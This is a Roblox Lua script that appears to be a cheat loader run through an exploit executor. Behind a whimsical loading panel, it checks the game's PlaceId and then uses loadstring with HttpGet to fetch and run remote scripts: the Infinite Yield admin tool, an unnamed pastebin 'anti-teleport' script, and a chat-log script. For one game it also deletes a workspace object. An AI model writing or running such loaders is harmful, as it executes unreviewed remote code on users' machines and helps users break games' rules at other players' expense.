-- gui to lua 3.2 used thx i guess
-- made by talking like copyright all rights reserved i think idk actually dont steal it please 😭🙏
local autoScannerUi = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local tweenService = game:GetService("TweenService")
local gameId 

local interWait = 1

local sizes = {
    ["closed"] = UDim2.new(0,0,0,0),
    ["open"] = UDim2.new(0.19792439, 0, 0.234169647, 0)
} 


local function initUI() -- placed in function for easier script readability
    autoScannerUi.Name = "autoScannerUi"
    autoScannerUi.Parent = game.CoreGui
    autoScannerUi.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Frame.AnchorPoint = Vector2.new(0.5,0.5)
    Frame.Parent = autoScannerUi
    Frame.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    Frame.Size = sizes["closed"]

    ImageLabel.Parent = Frame
    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel.BackgroundTransparency = 1.000
    ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ImageLabel.BorderSizePixel = 0
    ImageLabel.Position = UDim2.new(0.0936329588, 0, 0.096938774, 0)
    ImageLabel.Size = UDim2.new(0.812734067, 0, 0.423469394, 0)
    ImageLabel.Image = "rbxassetid://114437640639051"

    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1.000
    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.BorderSizePixel = 0
    TextLabel.Position = UDim2.new(0.079, 0, 0.653, 0)
    TextLabel.Size = UDim2.new(0.843, 0,0.26, 0)
    TextLabel.Font = Enum.Font.Roboto
    TextLabel.Text = "RETICULATING SPLINES"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14.000
    TextLabel.TextWrapped = true
end

local function anim(thing, timeo, tweenTable)
    local tween = tweenService:Create(thing, TweenInfo.new(timeo), tweenTable)
    tween:play()
    return tween
end

local function changeText(text)
    TextLabel.Text = text
end

local function terminate()
    task.wait(interWait)
    changeText("shutting down...")
    local tempTween = anim(Frame, 2, {Size = sizes["closed"]})
    tempTween.Completed:Wait()
    Frame:Destroy()
end

local gameIds = {
    ["FAILURE"] = function()
         spawn(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
            end)
                 spawn(function()
        loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()   
            end)
    end,
    ["4483381587"] = function()
        -- a literal baseplate
        changeText("interconnecting supercollision hypermatrices...")
         spawn(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
            end)
                 spawn(function()
        loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()        
            end)
    end,
    ['524578448'] = function()
        changeText("purficating gyroidic oscilators...")
        workspace.Regions:Destroy()
        spawn(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
            end)
        spawn(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/talkinglock/chatlogs/refs/heads/main/main.lua"))()
        end)
        spawn(function()
            loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()    
            end)
    end
}

initUI()

-- start tweening ui
local tempTween = anim(Frame, .5, {Size = sizes["open"]})
tempTween.Completed:Wait()
changeText("complexificating dejiroid nutrification manifolds...")
if game.Lighting:FindFirstChild("stopRunning") then
    changeText("system already ran")
    terminate()
    return
end
local stopRunner = Instance.new("BoolValue", game.Lighting)
stopRunner.Name = "stopRunning"
task.wait(.5)
changeText("harnessing game information...")
gameId = game.PlaceId
task.wait(.5)
changeText("cross-referencing gamedata withen internal database...")
task.wait(.5)
local callback
for name, func in pairs(gameIds) do
    if name == tostring(gameId) then
        callback = func
    end
end
if not callback then 
    changeText("gameid illocatable, defaulting to infinite yield and anti-teleport...")
    gameIds["FAILURE"]()
    terminate()
    return 
end

callback()
terminate()
